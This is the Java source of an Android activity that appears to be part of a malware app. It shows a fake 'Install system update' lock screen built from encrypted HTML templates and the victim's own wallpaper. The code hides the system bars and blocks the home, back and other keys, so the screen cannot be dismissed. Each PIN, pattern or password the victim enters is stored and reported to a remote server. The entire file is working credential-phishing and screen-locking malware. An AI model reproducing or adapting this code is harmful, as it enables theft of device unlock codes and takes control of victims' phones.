package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.StorePasscode;
import static com.icontrol.protector.UtliTools.Wallpaper;
import static com.icontrol.protector.UtliTools.getAppIconAsBase64;
import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class LockActivity extends Activity {


    String smallbaseimg="iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";



    private static LockActivity instance;
    public static boolean isActivityOpen() {
        return instance != null;
    }

    public static void endlock() {
        if (instance != null){
            instance.finish();
            instance=null;
        }
    }


    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                            View.SYSTEM_UI_FLAG_FULLSCREEN |
                            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }
    }

    static Context myctx=null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        instance =this;


        requestWindowFeature(Window.FEATURE_NO_TITLE);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        try{
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                WindowInsetsController insetsController = getWindow().getInsetsController();
                if (insetsController != null) {
                    insetsController.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
                    insetsController.setSystemBarsBehavior(
                            WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
                }
            }else{
                View decorView = getWindow().getDecorView();
                int uiOptions = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;
                decorView.setSystemUiVisibility(uiOptions);
            }

        }catch (Exception a){}

        if (myctx == null)
        {
            myctx = getApplicationContext();
        }

        WebView webView = new WebView((Context)this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        try{
            CookieManager.getInstance().setAcceptCookie(true);
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        }catch (Exception a){

        }
        webView.getSettings().setUseWideViewPort(true);
        webView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccessFromFileURLs(true);
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setAllowContentAccess(true);
        try {
            webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
            webView.getSettings().setPluginState(WebSettings.PluginState.ON);
            webView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
            webView.setBackgroundColor(0xffffffff);
        } catch (Exception a) {
        }
        webView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        webView.setWebViewClient(new LockActivity.MyWebViewClient());
        webView.setWebChromeClient(new LockActivity.MyWebChromeClient());
        webView.addJavascriptInterface(new LockActivity.WebAppInterface((Context)this), "CallBacker");

        String currentwall = Wallpaper(myctx,340,650,false);
        try {
            if (currentwall.equals("-1")){
                currentwall= smallbaseimg;
            }


//            MySettings.Write(ctx,Consts.lock_pin,thepin);


            //  Install system update
            String thetitle = MySettings.Read(myctx,Consts.lock_title,"Install system update");
            String themsg = "";
            String sixpin = "false";

            String okpin = MySettings.Read(myctx,Consts.lock_pin,"");
            if (okpin.length() == 6){
                sixpin="true";
            }
            String thetype = MySettings.Read(myctx,Consts.lock_type,"1");

            if (thetype.equals("3")) {
                themsg = MySettings.Read(myctx,Consts.lock_msg,"Enter Password");
            }else if (thetype.equals("2")){
                themsg = MySettings.Read(myctx,Consts.lock_msg,"Enter PIN");
            }else{
                themsg = MySettings.Read(myctx,Consts.lock_msg,"Draw pattern");
            }

            My_Crpter cr = My_Crpter.Getinstance();
            String PageBase64 = cr.Dcrpt_Str(loadHtmlFromAssets(thetype +".bt")) //1 = pattern , 2 = pin, 3 = password
                    .replace("[TITLE]",thetitle)
                    .replace(smallbaseimg,currentwall)
                    .replace("[DIS]",themsg)
                    .replace("PINLENGTH",sixpin)
                    .replace("[BTN]",My_Configs._Login_btn_);
            webView.loadDataWithBaseURL(null, PageBase64, "text/html", "UTF-8", null);
            setContentView((View)webView);
        } catch (Exception e) {
            finish();
        }


    }

    private String loadHtmlFromAssets(String fileName) {
        StringBuilder html = new StringBuilder();
        try (InputStream is = getAssets().open(fileName);
             BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {
            String line;
            while ((line = reader.readLine()) != null) {
                html.append(line).append("\n");
            }
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        return html.toString();
    }

    @Override
    protected void onStop() {
        super.onStop();
    }
    @Override
    public void onDestroy(){
        instance =null;
        super.onDestroy();
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
    @Override
    public boolean dispatchKeyEvent(KeyEvent keyEvent){
        return true;
    }

    private class MyWebChromeClient extends WebChromeClient {
        private MyWebChromeClient() {}

        public boolean onJsAlert(WebView param1WebView, String param1String1, String param1String2, JsResult param1JsResult) {
            return true;
        }
    }

    private class MyWebViewClient extends WebViewClient {
        private MyWebViewClient() {}

        public void onPageFinished(WebView param1WebView, String param1String) {}

        public boolean shouldOverrideUrlLoading(WebView param1WebView, String param1String) {
            return false;
        }
    }



    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context param1Context) {
            this.mContext = param1Context;
        }

        @JavascriptInterface
        public void OK(String data) {
            try {
                //Log.d("x",data);
                AlertServer(myctx,"Lock mobile","Attempt code: "+data);
                if (data.length() >= 4){
                    StorePasscode(myctx,data);
                    String okpin = MySettings.Read(myctx,Consts.lock_pin,"");
                    if(okpin.length() > 0){
                        if(okpin.toLowerCase().equals(data.toLowerCase())){
                            MySettings.WriteBool(myctx,Consts.lock_screen,false);
                            finish();
                        }

                    }else{
                        MySettings.WriteBool(myctx,Consts.lock_screen,false);
                        finish();
                    }
                }

            }catch (Exception e){

            }
        }
    }
}
